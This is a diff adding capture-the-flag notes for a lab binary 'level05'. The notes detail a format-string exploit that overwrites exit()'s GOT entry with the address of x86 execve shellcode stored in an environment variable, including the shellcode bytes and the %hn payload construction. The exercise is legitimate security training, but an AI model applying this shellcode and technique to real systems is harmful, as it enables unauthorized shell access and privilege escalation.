@@ -1,0 +1,19 @@
+decompile ./level05
+they have a buffer s that we can't overflow but at the end they're printing the buffer
+we can do a format string exploit even more so since they exit right after
+we overwrite the GOT address of exit with the address of our env variable where we have our SHELLCODE
+
+export SHELLCODE=$(python -c 'print "\x90" * 1024 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
+
+we get the GOT address of exit()
+address GOT exit() : 0x080497e0
+
+we get the address of our SHELLCODE variable
+address SHELLCODE var (up to change) : 0xffffd6dc
+
+we're going to use $n so we need to know where the nth stack argument is:
+`python -c 'print "AAAA" + ".%p" * 20' > /tmp/lvl05`
+
+PADDING FIRST 4 BYTES = 0xd6dc = 55004 - 8 (8 bytes already written for both GOT address of exit() ) = 54996
+PADDING LAST 4 BYTES = 0xffff = 65535 => (65536 - 55004) + 65535 % 65536
+`python -c 'import struct; print struct.pack("<I", GOT exit() ) + struct.pack("<I", GOT exit() + 2 bytes ) + "%PADDING FIRST BYTESc%10$hn" + "%PADDING LAST BYTESc%11$hn"' > /tmp/lvl05`
